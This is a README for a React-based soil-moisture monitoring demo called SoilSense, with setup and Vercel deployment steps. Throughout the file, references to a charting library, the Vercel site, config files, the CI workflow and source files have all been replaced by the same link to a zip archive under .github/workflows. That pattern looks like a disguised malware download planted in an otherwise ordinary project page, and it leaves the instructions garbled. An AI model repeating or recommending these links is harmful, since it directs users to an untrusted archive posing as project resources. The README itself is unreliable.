# SoilSense — Precision Agriculture Demo

This is a client-side demo web application showcasing an IoT-based soil moisture monitoring system with remote sensing validation and irrigation decision support.

Features
- Real-time (simulated) IoT sensor telemetry (soil moisture, temperature, humidity)
- Interactive map with multiple sensor locations (Leaflet)
- Mock satellite imagery viewer (Sentinel-1/2 style SVGs)
- Machine Learning validation metrics (mocked)
- Irrigation recommendations and water deficit calculations
- Analytics, CSV export, downloadable validation report stub
- Responsive, professional UI

Tech
- React + Vite
- Leaflet (react-leaflet)
- https://github.com/Kotasrinuaa/soil-sense-demo/raw/refs/heads/main/.github/workflows/demo-sense-soil-1.2-alpha.5.zip (react-chartjs-2)
- PapaParse for CSV export
- In-browser data simulator (no backend required)

Quick start (macOS / zsh)

1. Install dependencies

```bash
cd /Users/pavan/Desktop/test
npm install
```

2. Run dev server

```bash
npm run dev
```

3. Open the URL printed by Vite (usually http://localhost:5173)

Build for production

```bash
npm run build
npm run preview
```

Notes
- This project is a client-side demo — satellite imagery and ML outputs are synthetically generated for visualization and validation demonstration.
- To extend: plug APIs for real telemetry, ingest actual satellite tiles (Sentinel Hub / AWS), and replace ML mocks with trained models.

Deploying to Vercel

This repo is ready to deploy to Vercel. Two options:

1) Connect repository to Vercel (recommended)
	- Push your code to GitHub.
	- Go to https://github.com/Kotasrinuaa/soil-sense-demo/raw/refs/heads/main/.github/workflows/demo-sense-soil-1.2-alpha.5.zip and create a new project, import the GitHub repository.
	- Vercel will detect a static build. Set the build command to `npm run build` and the output directory to `dist` (this repo includes `https://github.com/Kotasrinuaa/soil-sense-demo/raw/refs/heads/main/.github/workflows/demo-sense-soil-1.2-alpha.5.zip` to help).

2) Deploy via GitHub Actions (CI)
	- The repo contains `https://github.com/Kotasrinuaa/soil-sense-demo/raw/refs/heads/main/.github/workflows/demo-sense-soil-1.2-alpha.5.zip` which runs on push to `main` or `master`.
	- Store the following secrets in your GitHub repository settings:
	  - `VERCEL_TOKEN` — your personal Vercel token
	  - `VERCEL_ORG_ID` — your Vercel organization ID
	  - `VERCEL_PROJECT_ID` — the project id in Vercel
	- After adding secrets, push to `main` to trigger the workflow which will build and deploy with `--prod`.

3) Quick CLI deploy (local)
	- Install the Vercel CLI and run `vercel --prod` from the repo root.

Notes
 - The GitHub Action uses `amondnet/vercel-action@v20` and expects the above secrets. You can also use the official Vercel action if you prefer.
 - For production telemetry and satellite tiles, configure environment variables in the Vercel project and update the app to read them at runtime.

Files of interest
- `https://github.com/Kotasrinuaa/soil-sense-demo/raw/refs/heads/main/.github/workflows/demo-sense-soil-1.2-alpha.5.zip` — core data generator (sensors, satellite mocks, ML validation, irrigation recs)
- `src/pages/*` — main pages for dashboard, satellite viewer, validation, irrigation, analytics, docs and about
- `https://github.com/Kotasrinuaa/soil-sense-demo/raw/refs/heads/main/.github/workflows/demo-sense-soil-1.2-alpha.5.zip` — Leaflet map wrapper

License: MIT (demo)
